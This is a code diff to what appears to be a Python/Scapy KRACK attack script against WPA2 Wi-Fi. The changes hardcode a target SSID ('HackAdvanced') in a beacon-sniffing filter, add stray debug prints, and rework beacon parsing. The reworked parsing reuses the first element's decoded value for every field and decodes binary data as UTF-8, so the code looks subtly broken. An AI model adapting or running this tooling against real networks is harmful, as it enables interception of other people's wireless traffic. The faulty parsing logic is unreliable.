@@ -184,6 +184,15 @@ def dot11_get_tid(p):
         return ord(str(p[Dot11QoS])[0]) & 0x0F
     return 0
 
+def PacketHandler(packet) :
+    if packet.haslayer(Dot11) :
+        if packet.type == 0 and packet.subtype == 8:
+            if packet.info.decode("utf-8") == "HackAdvanced":
+                print("Access Point MAC: %s with SSID: %s " %(packet.addr2, packet.info))
+                return packet
+    return None
+
+
 def dot11_is_group(p):
     # TODO: Detect if multicast bit is set in p.addr1
     return p.addr1 == "ff:ff:ff:ff:ff:ff"
@@ -275,8 +284,10 @@ def append_csa(p, channel, count=1):
     return p
 
 def get_tlv_value(p, type):
+    print("JAJAJAXD")
     if not Dot11Elt in p: return None
     el = p[Dot11Elt]
+    print("JEJEJEJEXD")
     while isinstance(el, Dot11Elt):
         if el.ID == type:
             return el.info
@@ -328,18 +339,20 @@ class NetworkConfig():
 
     def from_beacon(self, p):
         el = p[Dot11Elt]
+        info = el.info.decode("utf-8")
+        print("AAAAAAAAAAAAAA:  {}".format(el.info))
         while isinstance(el, Dot11Elt):
             if el.ID == IEEE_TLV_TYPE_SSID:
-                self.ssid = el.info
+                self.ssid = info
             elif el.ID == IEEE_TLV_TYPE_CHANNEL:
-                self.real_channel = ord(el.info[0])
+                self.real_channel = ord(info[0])
             elif el.ID == IEEE_TLV_TYPE_RSN:
-                self.parse_wparsn(el.info)
+                self.parse_wparsn(info)
                 self.wpavers |= 2
-            elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x01":
-                self.parse_wparsn(el.info[4:])
+            elif el.ID == IEEE_TLV_TYPE_VENDOR and info[:4] == "\x00\x50\xf2\x01":
+                self.parse_wparsn(info[4:])
                 self.wpavers |= 1
-            elif el.ID == IEEE_TLV_TYPE_VENDOR and el.info[:4] == "\x00\x50\xf2\x02":
+            elif el.ID == IEEE_TLV_TYPE_VENDOR and info[:4] == "\x00\x50\xf2\x02":
                 self.wmmenabled = 1
 
             el = el.payload
@@ -502,17 +515,20 @@ class KRAckAttack():
         self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
     def find_beacon(self, ssid):
-        ps = sniff(iface="wlan1mon", count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
+#        ps = sniff(iface="wlan1mon", count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
+        ps = sniff(iface="wlan1mon", count=1, timeout=0.1, lfilter=PacketHandler)
+        #ps = sniff(iface="wlan1mon", count=1, timeout=0.1, lfilter=PacketHandler, opened_socket=self.sock_real)
         if ps is None or len(ps) < 1:
             log(STATUS, "Searching for target network on other channels")
             while True:
                 self.sock_real.set_channel(6)
                 log(DEBUG, "Listening on channel %d" % 6)
-                ps = sniff(iface="wlan1mon", count=1, timeout=0.3, lfilter=lambda p: Dot11Beacon in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real)
+                ps = sniff(iface="wlan1mon", count=1, timeout=0.3, lfilter=PacketHandler)
                 print(ps)
                 if ps and len(ps) >= 1: break
 
         if ps and len(ps) >= 1:
+            print(ps)
             actual_chan = ord(get_tlv_value(ps[0], IEEE_TLV_TYPE_CHANNEL))
             self.sock_real.set_channel(actual_chan)
             self.beacon = ps[0]
